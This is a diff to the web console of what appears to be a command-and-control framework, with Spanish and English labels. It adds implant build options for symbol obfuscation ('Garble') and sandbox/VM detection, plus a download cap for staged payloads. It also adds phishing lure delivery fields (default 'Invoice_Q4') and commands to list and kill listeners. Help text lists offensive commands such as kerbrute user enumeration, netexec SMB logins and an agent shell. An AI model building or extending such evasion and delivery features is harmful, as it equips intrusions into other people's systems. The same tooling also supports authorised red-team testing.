@@ -925,6 +925,9 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                     <div class="form-row"><label>Stage Cleanup</label>
                       <label style="display:flex;align-items:center;gap:5px;text-transform:none;font-size:12px;color:var(--text);cursor:pointer"><input type="checkbox" id="pay-stageclean"> Activar</label>
                     </div>
+                    <div class="form-row"><label>Máx. descargas</label>
+                      <input id="pay-stagemaxdl" type="number" min="0" value="0" placeholder="0=ilimitado" style="width:80px" title="0 = ilimitado; otro número = máximo de descargas por archivo staged">
+                    </div>
                   </div>
                 </details>
               </div>
@@ -1050,6 +1053,19 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div class="form-row">
                 <label>Nombre del lure <span style="font-weight:400;color:var(--text3)">(sin extensión)</span></label>
                 <input id="dlv-lurename2" value="Invoice_Q4">
+              </div>
+              <div style="margin-top:10px">
+                <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:6px">Opciones de build</div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap">
+                  <label class="build-opt" id="dlv-opt-garble" style="flex:1;min-width:120px">
+                    <div class="build-opt-check"><input type="checkbox" id="dlv-garble" onchange="toggleBuildOpt('dlv-opt-garble',this)"></div>
+                    <div class="build-opt-body"><div class="build-opt-title">Garble</div><div class="build-opt-desc">Ofusca símbolos</div></div>
+                  </label>
+                  <label class="build-opt" id="dlv-opt-sandbox" style="flex:1;min-width:120px">
+                    <div class="build-opt-check"><input type="checkbox" id="dlv-sandbox" onchange="toggleBuildOpt('dlv-opt-sandbox',this)"></div>
+                    <div class="build-opt-body"><div class="build-opt-title">Sandbox checks</div><div class="build-opt-desc">Detecta VM/análisis</div></div>
+                  </label>
+                </div>
               </div>
             </div>
 
@@ -1264,6 +1280,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   <input id="dlv-stageurl" placeholder="http://10.0.0.1:8080" style="flex:1">
                   <button class="btn btn-ghost btn-sm" onclick="dlvFillStageURL()" title="Auto-fill desde tunnel activo">↙</button>
                 </div>
+              </div>
+              <div class="form-row" style="margin-bottom:8px">
+                <label>Máx. descargas <span style="font-weight:400;color:var(--text3)">(0=ilimitado)</span></label>
+                <input id="dlv-stagemaxdl" type="number" min="0" value="0" style="width:80px" title="0 = ilimitado">
               </div>
             </div>
 
@@ -6913,6 +6933,10 @@ const AC_COMMANDS = [
   ['!nmap','!nmap -sV -p <ports> <target>'],
   ['!kerbrute','!kerbrute userenum -d domain --dc <ip> users.txt'],
   // AGENTE
+  // SERVER
+  ['jobs','jobs — listar listeners activos del servidor'],
+  ['job kill','job kill <id> — detener listener por ID'],
+  // AGENTE
   ['info','detalles del agente'],
   ['shell','shell <cmd>'],
   ['sleep','sleep <sec> <jitter%>'],
@@ -7351,7 +7375,11 @@ function getHelpHTML(isWin) {
   return (helpLang === 'es' ? getHelpHTML_es : getHelpHTML_en)(isWin);
 }
 function getHelpHTML_en(isWin) {
-  return `<span class="console-section">LOCAL KALI  (!prefix)</span>
+  return `<span class="console-section">SERVER</span>
+  jobs                               list active server listeners
+  job kill &lt;id&gt;                      stop a listener by ID
+
+<span class="console-section">LOCAL KALI  (!prefix)</span>
   !&lt;cmd&gt;                             run on Kali, output streamed here
   !nxc smb &lt;t&gt; -u u -p p            netexec SMB
   !certipy-ad find -u u@d -p p ...  ADCS vuln scan
@@ -7481,7 +7509,11 @@ ${isWin ? `  link start [pipename] / link stop        connect to child agent via
 }
 
 function getHelpHTML_es(isWin) {
-  return `<span class="console-section">LOCAL KALI  (!prefijo)</span>
+  return `<span class="console-section">SERVIDOR</span>
+  jobs                               listar listeners activos del servidor
+  job kill &lt;id&gt;                      detener un listener por ID
+
+<span class="console-section">LOCAL KALI  (!prefijo)</span>
   !&lt;cmd&gt;                             ejecutar en Kali, output aquí mismo
   !nxc smb &lt;t&gt; -u u -p p            netexec SMB
   !certipy-ad find -u u@d -p p ...  ADCS vuln scan
@@ -9307,6 +9339,43 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     return;
   }
 
+  if (cmd === 'jobs') {
+    try {
+      const r = await api('GET', '/api/jobs');
+      if (r.ok && r.data) {
+        if (!r.data.length) {
+          addConsoleOutput('[*] no active jobs', '', null);
+        } else {
+          const hdr = 'ID    PROTOCOL  PORT   STATUS   STARTED';
+          const rows = r.data.map(j =>
+            `${String(j.id).padEnd(6)}${j.protocol.padEnd(10)}${String(j.port).padEnd(7)}${j.status.padEnd(9)}${new Date(j.started_at).toLocaleString()}`
+          );
+          addConsoleOutput([hdr, ...rows].join('\n'), '', null);
+        }
+      } else { addConsoleOutput('', r.error || 'failed to fetch jobs', null); }
+    } catch(e) { addConsoleOutput('', e.message, null); }
+    return;
+  }
+
+  if (cmd === 'job') {
+    const subcmd = rest[0]?.toLowerCase();
+    if (subcmd === 'kill') {
+      const jobId = rest[1];
+      if (!jobId) { addConsoleOutput('', 'usage: job kill <id>', null); return; }
+      try {
+        const r = await api('DELETE', `/api/jobs/${jobId}`);
+        if (r.ok) {
+          addConsoleOutput(`[+] job ${jobId} stopped`, '', null);
+        } else {
+          addConsoleOutput('', r.error || 'failed to stop job', null);
+        }
+      } catch(e) { addConsoleOutput('', e.message, null); }
+    } else {
+      addConsoleOutput('', `unknown subcommand. usage: job kill <id>`, null);
+    }
+    return;
+  }
+
   let taskType = '', taskArgs = '', payload = '';
 
   switch(cmd.toLowerCase()) {
@@ -10505,6 +10574,9 @@ async function unifiedBuild() {
       server_url: c2url, transport: trans,
       sleep_sec: sleep, jitter_pct: jit,
       output_name: lure || undefined,
+      lure_name: lure || undefined,
+      sandbox_checks: document.getElementById('dlv-sandbox')?.checked || false,
+      garble: document.getElementById('dlv-garble')?.checked || false,
     };
     const r = await api('POST', '/api/build', body);
     if (!r.ok) {
@@ -10954,7 +11026,7 @@ async function dlvBuild() {
 
   resultEl.innerHTML = '<span style="color:var(--text3)">Generando…</span>';
 
-  const body = { wrapper, artifact, lure_name: lureName, stage_url: stageURL, iso_label: isoLabel };
+  const body = { wrapper, artifact, lure_name: lureName, stage_url: stageURL, iso_label: isoLabel, stage_max_dl: parseInt(document.getElementById('dlv-stagemaxdl')?.value)||0 };
   try {
     const r = await api('POST', '/api/deliver', body);
     if (!r.ok) { resultEl.innerHTML = `<span style="color:var(--red)">${esc(r.error||'error')}</span>`; return; }
@@ -11055,6 +11127,7 @@ async function buildPayload() {
     working_hours:  document.getElementById('pay-hours').value.trim()   || '',
     max_retry:          parseInt(document.getElementById('pay-maxretry')?.value)||0,
     stage_cleanup:      document.getElementById('pay-stageclean')?.checked||false,
+    stage_max_dl:       parseInt(document.getElementById('pay-stagemaxdl')?.value)||0,
     guardrail_ip:       document.getElementById('pay-gr-ip')?.value.trim()||'',
     guardrail_user:     document.getElementById('pay-gr-user')?.value.trim()||'',
     guardrail_hostname: document.getElementById('pay-gr-host')?.value.trim()||'',
